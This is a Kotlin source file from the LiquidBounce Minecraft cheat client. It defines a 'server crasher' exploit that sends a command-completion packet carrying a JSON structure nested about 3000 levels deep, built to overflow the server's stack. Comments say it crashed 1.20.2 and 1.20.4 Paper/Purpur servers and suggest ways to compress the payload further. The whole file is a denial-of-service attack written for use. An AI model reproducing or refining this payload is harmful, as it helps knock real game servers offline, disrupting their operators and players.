package net.ccbluex.liquidbounce.features.module.modules.exploit.servercrasher.exploits

import com.google.gson.JsonObject
import net.ccbluex.liquidbounce.config.Choice
import net.ccbluex.liquidbounce.config.ChoiceConfigurable
import net.ccbluex.liquidbounce.features.module.modules.exploit.servercrasher.ModuleServerCrasher
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket
import net.ccbluex.liquidbounce.utils.client.logger

object CompletionExploit : Choice("Completion") {

    override val parent: ChoiceConfigurable
        get() = ModuleServerCrasher.exploitChoices

    override fun enable() {
        val overflow = try {
            //Levels should be configurable from 2200-3500
            generateJsonObject(3000).toString().replace("\"", "")
        } catch (e: StackOverflowError) {
            logger.warn("Failed to generate payload!", e)
            //Should not happen, server stack is more overloaded reading that.
            return;
        }

        // Seemed to work on 1.20.2, 1.20.4 paper/purpur servers, does not anymore.
        // Latest server builds can kick if partialCommand length is greater than 6144,
        // probably can be compressed even more.
        network.sendPacket(RequestCommandCompletionsC2SPacket(0, "msg @a[nbt=$overflow]"))
        ModuleServerCrasher.enabled = false
    }

    private fun generateJsonObject(levels: Int): JsonObject {
        val jsonObject = JsonObject()
        if (levels > 0) {
            jsonObject.add("a", generateJsonObject(levels - 1))
        }
        return jsonObject
    }

}
